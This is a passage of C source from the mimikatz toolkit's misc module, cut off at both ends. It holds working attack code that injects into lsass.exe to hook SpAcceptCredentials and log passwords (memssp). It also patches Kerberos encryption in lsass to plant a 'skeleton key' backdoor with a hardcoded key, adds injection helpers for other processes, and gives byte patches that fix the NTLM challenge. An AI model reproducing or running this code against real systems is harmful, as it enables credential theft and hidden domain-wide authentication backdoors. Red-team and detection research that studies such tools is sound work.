BYTE PTRN_WI81_MSV1_0[]	= {0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xd9, 0x49, 0x8b, 0xf8, 0x8b, 0xf1, 0x48};
KULL_M_PATCH_GENERIC MSV1_0AcceptReferences[] = {
	{KULL_M_WIN_MIN_BUILD_2K3,	{sizeof(PTRN_WIN5_MSV1_0),	PTRN_WIN5_MSV1_0},	{0, NULL}, {  0, sizeof(PTRN_WIN5_MSV1_0)}},
	{KULL_M_WIN_MIN_BUILD_VISTA,{sizeof(PTRN_WI6X_MSV1_0),	PTRN_WI6X_MSV1_0},	{0, NULL}, {-15, 15}},
	{KULL_M_WIN_MIN_BUILD_8,	{sizeof(PTRN_WI81_MSV1_0),	PTRN_WI81_MSV1_0},	{0, NULL}, {-17, 15}},
	{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WI81_MSV1_0),	PTRN_WI81_MSV1_0},	{0, NULL}, {-16, 15}},
	{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WI81_MSV1_0),	PTRN_WI81_MSV1_0},	{0, NULL}, {-17, 15}},
	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_WI81_MSV1_0),	PTRN_WI81_MSV1_0},	{0, NULL}, {-16, 15}},
};
#elif defined(_M_IX86)
BYTE INSTR_JMP[]= {0xe9}; // need 5
BYTE PTRN_WIN5_MSV1_0[] = {0x8b, 0xff, 0x55, 0x8b, 0xec, 0xff, 0x75, 0x14, 0xff, 0x75, 0x10, 0xff, 0x75, 0x08, 0xe8};
BYTE PTRN_WI6X_MSV1_0[]	= {0xff, 0x75, 0x14, 0xff, 0x75, 0x10, 0xff, 0x75, 0x08, 0xe8, 0x24, 0x00, 0x00, 0x00};
BYTE PTRN_WI80_MSV1_0[] = {0xff, 0x75, 0x08, 0x8b, 0x4d, 0x14, 0x8b, 0x55, 0x10, 0xe8};
BYTE PTRN_WI81_MSV1_0[]	= {0xff, 0x75, 0x14, 0x8b, 0x55, 0x10, 0x8b, 0x4d, 0x08, 0xe8};
BYTE PTRN_W10_1703_MSV1_0[] = {0x8b, 0x55, 0x10, 0x8b, 0x4d, 0x08, 0x56, 0xff, 0x75, 0x14, 0xe8};
KULL_M_PATCH_GENERIC MSV1_0AcceptReferences[] = {
	{KULL_M_WIN_MIN_BUILD_XP,	{sizeof(PTRN_WIN5_MSV1_0),	PTRN_WIN5_MSV1_0},	{0, NULL}, {  0, 5}},
	{KULL_M_WIN_MIN_BUILD_VISTA,{sizeof(PTRN_WI6X_MSV1_0),	PTRN_WI6X_MSV1_0},	{0, NULL}, {-41, 5}},
	{KULL_M_WIN_MIN_BUILD_8,	{sizeof(PTRN_WI80_MSV1_0),	PTRN_WI80_MSV1_0},	{0, NULL}, {-43, 5}},
	{KULL_M_WIN_MIN_BUILD_BLUE,	{sizeof(PTRN_WI81_MSV1_0),	PTRN_WI81_MSV1_0},	{0, NULL}, {-39, 5}},
	{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_W10_1703_MSV1_0),	PTRN_W10_1703_MSV1_0},	{0, NULL}, {-28, 15}},
};
#endif
PCWCHAR szMsvCrt = L"msvcrt.dll";
NTSTATUS kuhl_m_misc_memssp(int argc, wchar_t * argv[])
{
	HANDLE hProcess;
	DWORD processId;
	KULL_M_MEMORY_ADDRESS aLsass, aLocal = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	KULL_M_MEMORY_SEARCH sSearch;
	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION iMSV;
	PKULL_M_PATCH_GENERIC pGeneric;
	REMOTE_EXT extensions[] = {
		{szMsvCrt,	"fopen",	(PVOID) 0x4141414141414141, NULL},
		{szMsvCrt,	"fwprintf",	(PVOID) 0x4242424242424242, NULL},
		{szMsvCrt,	"fclose",	(PVOID) 0x4343434343434343, NULL},
		{NULL,		NULL,		(PVOID) 0x4444444444444444, NULL},
	};
	MULTIPLE_REMOTE_EXT extForCb = {ARRAYSIZE(extensions), extensions};

	DWORD trampoSize;
	if(kull_m_process_getProcessIdForName(L"lsass.exe", &processId))
	{
		if(hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, processId))
		{
			if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &aLsass.hMemory))
			{
				if(kull_m_process_getVeryBasicModuleInformationsForName(aLsass.hMemory, L"msv1_0.dll", &iMSV))
				{
					sSearch.kull_m_memoryRange.kull_m_memoryAdress = iMSV.DllBase;
					sSearch.kull_m_memoryRange.size = iMSV.SizeOfImage;
					if(pGeneric = kull_m_patch_getGenericFromBuild(MSV1_0AcceptReferences, ARRAYSIZE(MSV1_0AcceptReferences), MIMIKATZ_NT_BUILD_NUMBER))
					{
						aLocal.address = pGeneric->Search.Pattern;
						if(kull_m_memory_search(&aLocal, pGeneric->Search.Length, &sSearch, TRUE))
						{
							trampoSize = pGeneric->Offsets.off1 + sizeof(INSTR_JMP) + sizeof(PVOID);
							if(aLocal.address = LocalAlloc(LPTR, trampoSize))
							{
								sSearch.result = (PBYTE) sSearch.result + pGeneric->Offsets.off0;
								aLsass.address = sSearch.result;
								if(kull_m_memory_copy(&aLocal, &aLsass, pGeneric->Offsets.off1))
								{
									RtlCopyMemory((PBYTE) aLocal.address + pGeneric->Offsets.off1, INSTR_JMP, sizeof(INSTR_JMP));
									if(kull_m_memory_alloc(&aLsass, trampoSize, PAGE_EXECUTE_READWRITE))
									{
									#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
										*(PVOID *)((PBYTE) aLocal.address + pGeneric->Offsets.off1 + sizeof(INSTR_JMP)) = (PBYTE) sSearch.result + pGeneric->Offsets.off1;
									#elif defined(_M_IX86)
										*(LONG *)((PBYTE) aLocal.address + pGeneric->Offsets.off1 + sizeof(INSTR_JMP)) = (PBYTE) sSearch.result - ((PBYTE) aLsass.address + sizeof(INSTR_JMP) + sizeof(LONG));
									#endif
										extensions[3].Pointer = aLsass.address;
										if(kull_m_memory_copy(&aLsass, &aLocal, trampoSize))
										{
											if(kull_m_remotelib_CreateRemoteCodeWitthPatternReplace(aLsass.hMemory, misc_msv1_0_SpAcceptCredentials, (DWORD) ((PBYTE) misc_msv1_0_SpAcceptCredentials_end - (PBYTE) misc_msv1_0_SpAcceptCredentials), &extForCb, &aLsass))
											{
												RtlCopyMemory((PBYTE) aLocal.address, INSTR_JMP, sizeof(INSTR_JMP));
											#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
												*(PVOID *)((PBYTE) aLocal.address + sizeof(INSTR_JMP)) = aLsass.address;
											#elif defined(_M_IX86)
												*(LONG *)((PBYTE) aLocal.address + sizeof(INSTR_JMP)) = (PBYTE) aLsass.address - ((PBYTE) sSearch.result + sizeof(INSTR_JMP) + sizeof(LONG));
											#endif
												aLsass.address = sSearch.result;
												if(kull_m_memory_copy(&aLsass, &aLocal, pGeneric->Offsets.off1))
													kprintf(L"Injected =)\n");
												else PRINT_ERROR_AUTO(L"kull_m_memory_copy - Trampoline n0");
											}
											else PRINT_ERROR_AUTO(L"kull_m_remotelib_CreateRemoteCodeWitthPatternReplace");
										}
										else PRINT_ERROR_AUTO(L"kull_m_memory_copy - Trampoline n1");
									}
								}
								else PRINT_ERROR_AUTO(L"kull_m_memory_copy - real asm");
								LocalFree(aLocal.address);
							}
						}
						else PRINT_ERROR_AUTO(L"kull_m_memory_search");
					}
				}
				kull_m_memory_close(aLsass.hMemory);
			}
			CloseHandle(hProcess);
		}
		else PRINT_ERROR_AUTO(L"OpenProcess");
	}
	else PRINT_ERROR_AUTO(L"kull_m_process_getProcessIdForName");

	return STATUS_SUCCESS;
}

typedef PVOID	(__cdecl * PMEMCPY) (__out_bcount_full_opt(_MaxCount) void * _Dst, __in_bcount_opt(_MaxCount) const void * _Src, __in size_t _MaxCount);
typedef HLOCAL	(WINAPI * PLOCALALLOC) (__in UINT uFlags, __in SIZE_T uBytes);
typedef HLOCAL	(WINAPI * PLOCALFREE) (__deref HLOCAL hMem);
#pragma optimize("", off)
NTSTATUS WINAPI kuhl_misc_skeleton_rc4_init(LPCVOID Key, DWORD KeySize, DWORD KeyUsage, PVOID * pContext)
{
	NTSTATUS status = STATUS_INSUFFICIENT_RESOURCES;
	PVOID origContext, kiwiContext;
	DWORD kiwiKey[] = {0xca4fba60, 0x7a6c46dc, 0x81173c03, 0xf63dc094};
	if(*pContext = ((PLOCALALLOC) 0x4a4a4a4a4a4a4a4a)(0, 32 + sizeof(PVOID)))
	{
		status = ((PKERB_ECRYPT_INITIALIZE) 0x4343434343434343)(Key, KeySize, KeyUsage, &origContext);
		if(NT_SUCCESS(status))
		{
			((PMEMCPY) 0x4c4c4c4c4c4c4c4c)((PBYTE) *pContext + 0, origContext, 16);
			status = ((PKERB_ECRYPT_INITIALIZE) 0x4343434343434343)(kiwiKey, 16, KeyUsage, &kiwiContext);
			if(NT_SUCCESS(status))
			{
				((PMEMCPY) 0x4c4c4c4c4c4c4c4c)((PBYTE) *pContext + 16, kiwiContext, 16);
				((PLOCALFREE) 0x4b4b4b4b4b4b4b4b)(kiwiContext);
			}
			*(LPCVOID *) ((PBYTE) *pContext + 32) = Key;
			((PLOCALFREE) 0x4b4b4b4b4b4b4b4b)(origContext);
		}
		if(!NT_SUCCESS(status))
		{
			((PLOCALFREE) 0x4b4b4b4b4b4b4b4b)(*pContext);
			*pContext = NULL;
		}
	}
	return status;
}
NTSTATUS WINAPI kuhl_misc_skeleton_rc4_init_decrypt(PVOID pContext, LPCVOID Data, DWORD DataSize, PVOID Output, DWORD * OutputSize)
{
	NTSTATUS status = STATUS_INSUFFICIENT_RESOURCES;
	DWORD origOutputSize = *OutputSize, kiwiKey[] = {0xca4fba60, 0x7a6c46dc, 0x81173c03, 0xf63dc094};
	PVOID buffer;
	if(buffer = ((PLOCALALLOC) 0x4a4a4a4a4a4a4a4a)(0, DataSize))
	{
		((PMEMCPY) 0x4c4c4c4c4c4c4c4c)(buffer, Data, DataSize);
		status = ((PKERB_ECRYPT_DECRYPT) 0x4444444444444444)(pContext, buffer, DataSize, Output, OutputSize);
		if(!NT_SUCCESS(status))
		{
			*OutputSize = origOutputSize;
			status = ((PKERB_ECRYPT_DECRYPT) 0x4444444444444444)((PBYTE) pContext + 16, buffer, DataSize, Output, OutputSize);
			if(NT_SUCCESS(status))
				((PMEMCPY) 0x4c4c4c4c4c4c4c4c)(*(PVOID *) ((PBYTE) pContext + 32), kiwiKey, 16);
		}
		((PLOCALFREE) 0x4b4b4b4b4b4b4b4b)(buffer);
	}
	return status;
}
DWORD kuhl_misc_skeleton_rc4_end(){return 'skel';}
#pragma optimize("", on)
wchar_t newerKey[] = L"Kerberos-Newer-Keys";

NTSTATUS kuhl_m_misc_skeleton(int argc, wchar_t * argv[])
{
	BOOL success = FALSE;
	PKERB_ECRYPT pCrypt;
	DWORD processId;
	HANDLE hProcess;
	PBYTE localAddr, ptrValue = NULL;
	KULL_M_MEMORY_ADDRESS aLsass, aLocal = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION cryptInfos;
	KULL_M_MEMORY_SEARCH sMemory;
	LSA_UNICODE_STRING orig;
	REMOTE_EXT extensions[] = {
		{L"kernel32.dll",	"LocalAlloc",	(PVOID) 0x4a4a4a4a4a4a4a4a, NULL},
		{L"kernel32.dll",	"LocalFree",	(PVOID) 0x4b4b4b4b4b4b4b4b, NULL},
		{L"ntdll.dll",		"memcpy",		(PVOID) 0x4c4c4c4c4c4c4c4c, NULL},
		{NULL,				NULL,			(PVOID) 0x4343434343434343, NULL}, // Initialize
		{NULL,				NULL,			(PVOID) 0x4444444444444444, NULL}, // Decrypt
	};
	MULTIPLE_REMOTE_EXT extForCb = {ARRAYSIZE(extensions), extensions};
	BOOL onlyRC4Stuff = (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_VISTA) || kull_m_string_args_byName(argc, argv, L"letaes", NULL, NULL);
	RtlZeroMemory(&orig, sizeof(orig));
	RtlInitUnicodeString(&orig, newerKey);
	if(kull_m_process_getProcessIdForName(L"lsass.exe", &processId))
	{
		if(hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, processId))
		{
			if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &aLsass.hMemory))
			{
				if(!onlyRC4Stuff)
				{
					if(kull_m_process_getVeryBasicModuleInformationsForName(aLsass.hMemory, L"kdcsvc.dll", &cryptInfos))
					{
						aLocal.address = newerKey;
						sMemory.kull_m_memoryRange.kull_m_memoryAdress = cryptInfos.DllBase;
						sMemory.kull_m_memoryRange.size = cryptInfos.SizeOfImage;
						if(kull_m_memory_search(&aLocal, sizeof(newerKey), &sMemory, TRUE))
						{
							kprintf(L"[KDC] data\n");
							aLocal.address = &orig;
							orig.Buffer = (PWSTR) sMemory.result;
							if(kull_m_memory_search(&aLocal, sizeof(orig), &sMemory, TRUE))
							{
								kprintf(L"[KDC] struct\n", sMemory.result);
								RtlZeroMemory(&orig, sizeof(orig));
								aLsass.address = sMemory.result;
								if(success = kull_m_memory_copy(&aLsass, &aLocal, sizeof(orig)))
									kprintf(L"[KDC] keys patch OK\n");
							}
							else PRINT_ERROR(L"Second pattern not found\n");
						}
						else PRINT_ERROR(L"First pattern not found\n");
					}
					else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
				}

				if(success || onlyRC4Stuff)
				{
					if(kull_m_process_getVeryBasicModuleInformationsForName(aLsass.hMemory, L"cryptdll.dll", &cryptInfos))
					{
						localAddr = (PBYTE) GetModuleHandle(L"cryptdll.dll");
						if(NT_SUCCESS(CDLocateCSystem(KERB_ETYPE_RC4_HMAC_NT, &pCrypt)))
						{
							extensions[3].Pointer = (PBYTE) cryptInfos.DllBase.address + ((PBYTE) pCrypt->Initialize - localAddr);
							extensions[4].Pointer = (PBYTE) cryptInfos.DllBase.address + ((PBYTE) pCrypt->Decrypt - localAddr);
							if(kull_m_remotelib_CreateRemoteCodeWitthPatternReplace(aLsass.hMemory, kuhl_misc_skeleton_rc4_init, (DWORD) ((PBYTE) kuhl_misc_skeleton_rc4_end - (PBYTE) kuhl_misc_skeleton_rc4_init), &extForCb, &aLsass))
							{
								kprintf(L"[RC4] functions\n");
								ptrValue = (PBYTE) aLsass.address;
								aLocal.address = &ptrValue;
								aLsass.address = (PBYTE) cryptInfos.DllBase.address + ((PBYTE) pCrypt - localAddr) + FIELD_OFFSET(KERB_ECRYPT, Initialize);
								if(kull_m_memory_copy(&aLsass, &aLocal, sizeof(PVOID)))
								{
									kprintf(L"[RC4] init patch OK\n");
									ptrValue += (PBYTE) kuhl_misc_skeleton_rc4_init_decrypt - (PBYTE) kuhl_misc_skeleton_rc4_init;
									aLsass.address = (PBYTE) cryptInfos.DllBase.address + ((PBYTE) pCrypt - localAddr) + FIELD_OFFSET(KERB_ECRYPT, Decrypt);
									if(kull_m_memory_copy(&aLsass, &aLocal, sizeof(PVOID)))
										kprintf(L"[RC4] decrypt patch OK\n");
								}
							}
							else PRINT_ERROR(L"Unable to create remote functions\n");
						}
					}
					else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
				}
				kull_m_memory_close(aLsass.hMemory);
			}
			CloseHandle(hProcess);
		}
		else PRINT_ERROR_AUTO(L"OpenProcess");
	}
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_misc_compress(int argc, wchar_t * argv[])
{
	LPCWSTR szInput, szOutput;
	PVOID pInput, pOutput;
	DWORD dwInput, dwOutput;
#pragma warning(push)
#pragma warning(disable:4996)
	if(kull_m_string_args_byName(argc, argv, L"input", &szInput, _wpgmptr))
#pragma warning(pop)
	{
		if(kull_m_string_args_byName(argc, argv, L"output", &szOutput, MIMIKATZ L"_" MIMIKATZ_ARCH L".compressed"))
		{
			kprintf(L"Input : %s\nOutput: %s\n\nOpening: ", szInput, szOutput);
			if(kull_m_file_readData(szInput, (PBYTE *) &pInput, &dwInput))
			{
				kprintf(L"OK\n");
				kprintf(L" * Original size  : %u\n", dwInput);
				if(kull_m_memory_quick_compress(pInput, dwInput, &pOutput, &dwOutput))
				{
					kprintf(L" * Compressed size: %u (%.2f%%)\n", dwOutput, 100 * ((float) dwOutput / (float) dwInput));
					kprintf(L"Writing: ");
					if(kull_m_file_writeData(szOutput, pOutput, dwOutput))
						kprintf(L"OK\n");
					else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
					LocalFree(pOutput);
				}
			}
			else PRINT_ERROR_AUTO(L"kull_m_file_readData");
		}
		else PRINT_ERROR(L"An /output:file is needed\n");
	}
	else PRINT_ERROR(L"An /input:file is needed\n");
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_misc_lock(int argc, wchar_t * argv[])
{
	PCWCHAR process;
	UNICODE_STRING uProcess;
	kull_m_string_args_byName(argc, argv, L"process", &process, L"explorer.exe");
	RtlInitUnicodeString(&uProcess, process);
	kprintf(L"Proxy process : %wZ\n", &uProcess);
	kull_m_process_getProcessInformation(kuhl_m_misc_lock_callback, &uProcess);
	return STATUS_SUCCESS;
}

BOOL CALLBACK kuhl_m_misc_lock_callback(PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, PVOID pvArg)
{
	DWORD pid;
	if(RtlEqualUnicodeString(&pSystemProcessInformation->ImageName, &((PKIWI_WP_DATA) pvArg)->process, TRUE))
	{
		pid = PtrToUlong(pSystemProcessInformation->UniqueProcessId);
		kprintf(L"> Found %wZ with PID %u : ", &pSystemProcessInformation->ImageName, pid);
		kuhl_m_misc_lock_for_pid(pid, ((PKIWI_WP_DATA) pvArg)->wp);
	}
	return TRUE;
}

#pragma optimize("", off)
DWORD WINAPI kuhl_m_misc_lock_thread(PREMOTE_LIB_DATA lpParameter)
{
	lpParameter->output.outputStatus = STATUS_SUCCESS;
	if(!((PLOCKWORKSTATION) 0x4141414141414141)())
		lpParameter->output.outputStatus = ((PGETLASTERROR) 0x4242424242424242)();
	return STATUS_SUCCESS;
}
DWORD kuhl_m_misc_lock_thread_end(){return 'stlo';}
#pragma optimize("", on)

void kuhl_m_misc_lock_for_pid(DWORD pid, PCWCHAR wp)
{
	REMOTE_EXT extensions[] = {
		{L"user32.dll",		"LockWorkStation",	(PVOID) 0x4141414141414141, NULL},
		{L"kernel32.dll",	"GetLastError",		(PVOID) 0x4242424242424242, NULL},
	};
	MULTIPLE_REMOTE_EXT extForCb = {ARRAYSIZE(extensions), extensions};
	HANDLE hProcess;
	PKULL_M_MEMORY_HANDLE hMemory = NULL;
	KULL_M_MEMORY_ADDRESS aRemoteFunc;
	PREMOTE_LIB_INPUT_DATA iData;
	REMOTE_LIB_OUTPUT_DATA oData;
	
	if(hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD, FALSE, pid))
	{
		if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &hMemory))
		{
			if(kull_m_remotelib_CreateRemoteCodeWitthPatternReplace(hMemory, kuhl_m_misc_lock_thread, (DWORD) ((PBYTE) kuhl_m_misc_lock_thread_end - (PBYTE) kuhl_m_misc_lock_thread), &extForCb, &aRemoteFunc))
			{
				if(iData = kull_m_remotelib_CreateInput(NULL, 0, 0, NULL))
				{
					if(kull_m_remotelib_create(&aRemoteFunc, iData, &oData))
					{
						if(oData.outputStatus)
							kprintf(L"error %u\n", oData.outputStatus);
						else
							kprintf(L"OK!\n");
					}
					else PRINT_ERROR_AUTO(L"kull_m_remotelib_create");
					LocalFree(iData);
				}
				kull_m_memory_free(&aRemoteFunc);
			}
			else PRINT_ERROR(L"kull_m_remotelib_CreateRemoteCodeWitthPatternReplace\n");
			kull_m_memory_close(hMemory);
		}
		CloseHandle(hProcess);
	}
	else PRINT_ERROR_AUTO(L"OpenProcess");
}

NTSTATUS kuhl_m_misc_wp(int argc, wchar_t * argv[])
{
	KIWI_WP_DATA data;
	PCWCHAR process;
	if(kull_m_string_args_byName(argc, argv, L"file", &data.wp, NULL))
	{
		kull_m_string_args_byName(argc, argv, L"process", &process, L"explorer.exe");
		RtlInitUnicodeString(&data.process, process);
		kprintf(L"Wallpaper file: %s\n", data.wp);
		kprintf(L"Proxy process : %wZ\n", &data.process);
		kull_m_process_getProcessInformation(kuhl_m_misc_wp_callback, &data);
	}
	else PRINT_ERROR(L"file argument is needed\n");
	return STATUS_SUCCESS;
}

BOOL CALLBACK kuhl_m_misc_wp_callback(PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, PVOID pvArg)
{
	DWORD pid;
	if(RtlEqualUnicodeString(&pSystemProcessInformation->ImageName, &((PKIWI_WP_DATA) pvArg)->process, TRUE))
	{
		pid = PtrToUlong(pSystemProcessInformation->UniqueProcessId);
		kprintf(L"> Found %wZ with PID %u : ", &pSystemProcessInformation->ImageName, pid);
		kuhl_m_misc_wp_for_pid(pid, ((PKIWI_WP_DATA) pvArg)->wp);
	}
	return TRUE;
}

#pragma optimize("", off)
DWORD WINAPI kuhl_m_misc_wp_thread(PREMOTE_LIB_DATA lpParameter)
{
	lpParameter->output.outputStatus = STATUS_SUCCESS;
	if(!((PSYSTEMPARAMETERSINFOW) 0x4141414141414141)(SPI_SETDESKWALLPAPER, 0, lpParameter->input.inputData, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE))
		lpParameter->output.outputStatus = ((PGETLASTERROR) 0x4242424242424242)();
	return STATUS_SUCCESS;
}
DWORD kuhl_m_misc_wp_thread_end(){return 'stwp';}
#pragma optimize("", on)

void kuhl_m_misc_wp_for_pid(DWORD pid, PCWCHAR wp)
{
	REMOTE_EXT extensions[] = {
		{L"user32.dll",		"SystemParametersInfoW",	(PVOID) 0x4141414141414141, NULL},
		{L"kernel32.dll",	"GetLastError",				(PVOID) 0x4242424242424242, NULL},
	};
	MULTIPLE_REMOTE_EXT extForCb = {ARRAYSIZE(extensions), extensions};
	HANDLE hProcess;
	PKULL_M_MEMORY_HANDLE hMemory = NULL;
	KULL_M_MEMORY_ADDRESS aRemoteFunc;
	PREMOTE_LIB_INPUT_DATA iData;
	REMOTE_LIB_OUTPUT_DATA oData;

	if(hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD, FALSE, pid))
	{
		if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &hMemory))
		{
			if(kull_m_remotelib_CreateRemoteCodeWitthPatternReplace(hMemory, kuhl_m_misc_wp_thread, (DWORD) ((PBYTE) kuhl_m_misc_wp_thread_end - (PBYTE) kuhl_m_misc_wp_thread), &extForCb, &aRemoteFunc))
			{
				if(iData = kull_m_remotelib_CreateInput(NULL, 0, (lstrlenW(wp) + 1) * sizeof(wchar_t), wp))
				{
					if(kull_m_remotelib_create(&aRemoteFunc, iData, &oData))
					{
						if(oData.outputStatus)
							kprintf(L"error %u\n", oData.outputStatus);
						else
							kprintf(L"OK!\n");
					}
					else PRINT_ERROR_AUTO(L"kull_m_remotelib_create");
					LocalFree(iData);
				}
				kull_m_memory_free(&aRemoteFunc);
			}
			else PRINT_ERROR(L"kull_m_remotelib_CreateRemoteCodeWitthPatternReplace\n");
			kull_m_memory_close(hMemory);
		}
		CloseHandle(hProcess);
	}
	else PRINT_ERROR_AUTO(L"OpenProcess");
}

NTSTATUS kuhl_m_misc_mflt(int argc, wchar_t * argv[])
{
	PFILTER_AGGREGATE_BASIC_INFORMATION info, info2;
	DWORD szNeeded;// = 0;
	HANDLE hDevice;
	HRESULT res;

	res = FilterFindFirst(FilterAggregateBasicInformation, NULL, 0, &szNeeded, &hDevice);
	if(res == HRESULT_FROM_WIN32(ERROR_INSUFFICIENT_BUFFER))
	{
		if(info = (PFILTER_AGGREGATE_BASIC_INFORMATION) LocalAlloc(LPTR, szNeeded))
		{
			res = FilterFindFirst(FilterAggregateBasicInformation, info, szNeeded, &szNeeded, &hDevice);
			if(res == S_OK)
			{
				kuhl_m_misc_mflt_display(info);
				do
				{
					res = FilterFindNext(hDevice, FilterAggregateBasicInformation, NULL, 0, &szNeeded);
					if(res == HRESULT_FROM_WIN32(ERROR_INSUFFICIENT_BUFFER))
					{
						if(info2 = (PFILTER_AGGREGATE_BASIC_INFORMATION) LocalAlloc(LPTR, szNeeded))
						{
							res = FilterFindNext(hDevice, FilterAggregateBasicInformation, info2, szNeeded, &szNeeded);
							if(res == S_OK)
								kuhl_m_misc_mflt_display(info2);
							else PRINT_ERROR(L"FilterFindNext(data): 0x%08x\n", res);
							LocalFree(info2);
						}
					}
					else if(res != HRESULT_FROM_WIN32(ERROR_NO_MORE_ITEMS)) PRINT_ERROR(L"FilterFindNext(size): 0x%08x\n", res);
				}
				while(res == S_OK);
			}
			else PRINT_ERROR(L"FilterFindFirst(data): 0x%08x\n", res);
			LocalFree(info);
		}
	}
	else if(res != HRESULT_FROM_WIN32(ERROR_NO_MORE_ITEMS)) (L"FilterFindFirst(size): 0x%08x\n", res);
	return STATUS_SUCCESS;
}

void kuhl_m_misc_mflt_display(PFILTER_AGGREGATE_BASIC_INFORMATION info)
{
	DWORD offset;
	do
	{
		switch(info->Flags)
		{
		case FLTFL_AGGREGATE_INFO_IS_MINIFILTER:
			kprintf(L"%u %u %10.*s %.*s\n",
				info->Type.MiniFilter.FrameID, info->Type.MiniFilter.NumberOfInstances,
				info->Type.MiniFilter.FilterAltitudeLength / sizeof(wchar_t), (PBYTE) info + info->Type.MiniFilter.FilterAltitudeBufferOffset,
				info->Type.MiniFilter.FilterNameLength / sizeof(wchar_t), (PBYTE) info + info->Type.MiniFilter.FilterNameBufferOffset
			);
			break;
		case FLTFL_AGGREGATE_INFO_IS_LEGACYFILTER:
			kprintf(L"--- LEGACY --- %.*s\n", info->Type.LegacyFilter.FilterNameLength / sizeof(wchar_t), (PBYTE) info + info->Type.LegacyFilter.FilterNameBufferOffset);
			break;
		default:
			;
		}
		offset = info->NextEntryOffset;
		info = (PFILTER_AGGREGATE_BASIC_INFORMATION) ((PBYTE) info + offset);
	}
	while(offset);
}

#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
BYTE PTRN_WI7_SHNM[] = {0x49, 0xbb, 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00, 0x48, 0xb8, 0x06, 0x01, 0xb1, 0x1d, 0x00, 0x00, 0x00, 0x0f, 0x48, 0x8d, 0x4e, 0x18, 0x8b, 0xd3, 0xc7, 0x46, 0x08, 0x02, 0x00, 0x00, 0x00, 0x4c, 0x89, 0x1e, 0x48, 0x89, 0x46, 0x30, 0xe8};
BYTE PATC_WI7_SHNM[] = {0xc7, 0x46, 0x08, 0x02, 0x00, 0x00, 0x00, 0x4c, 0x89, 0x1e, 0x48, 0x89, 0x46, 0x30, 0x48, 0xb8, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x48, 0x89, 0x46, 0x18, 0x90, 0x90, 0x90, 0x90, 0x90};
BYTE PTRN_W10_1709_SHNM[] = {0x48, 0xb8, 0x0a, 0x00, 0xab, 0x3f, 0x00, 0x00, 0x00, 0x0f, 0xba, 0x08, 0x00, 0x00, 0x00, 0x48, 0x89, 0x47, 0x30, 0xff, 0x15};
BYTE PATC_W10_1709_SHNM[] = {0x48, 0xb8, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x48, 0x89, 0x47, 0x18};
KULL_M_PATCH_GENERIC SHNMReferences[] = {
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WI7_SHNM),			PTRN_WI7_SHNM},			{sizeof(PATC_WI7_SHNM),			PATC_WI7_SHNM},			{20}},
	{KULL_M_WIN_BUILD_10_1709,	{sizeof(PTRN_W10_1709_SHNM),	PTRN_W10_1709_SHNM},	{sizeof(PATC_W10_1709_SHNM),	PATC_W10_1709_SHNM},	{19}},
};
#elif defined(_M_IX86)
BYTE PTRN_WI7_SHNM[] = {0xc7, 0x43, 0x30, 0x06, 0x01, 0xb1, 0x1d, 0xc7, 0x43, 0x34, 0x00, 0x00, 0x00, 0x0f, 0xe8};
BYTE PATC_WI7_SHNM[] = {0x58, 0x58, 0xc7, 0x43, 0x18, 0x11, 0x22, 0x33, 0x44, 0xc7, 0x43, 0x1c, 0x55, 0x66, 0x77, 0x88};
BYTE PTRN_W10_1709_SHNM[] = {0x8d, 0x43, 0x18, 0x6a, 0x08, 0x50, 0xc7, 0x43, 0x08, 0x02, 0x00, 0x00, 0x00, 0xc7, 0x43, 0x30, 0x0a, 0x00, 0xab, 0x3f, 0xc7, 0x43, 0x34, 0x00, 0x00, 0x00, 0x0f, 0xff, 0x15};
BYTE PATC_W10_1709_SHNM[] = {0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xc7, 0x43, 0x08, 0x02, 0x00, 0x00, 0x00, 0xc7, 0x43, 0x30, 0x0a, 0x00, 0xab, 0x3f, 0xc7, 0x43, 0x34, 0x00, 0x00, 0x00, 0x0f, 0xc7, 0x43, 0x18, 0x11, 0x22, 0x33, 0x44, 0xc7, 0x43, 0x1c, 0x55, 0x66, 0x77, 0x88}; //
KULL_M_PATCH_GENERIC SHNMReferences[] = {
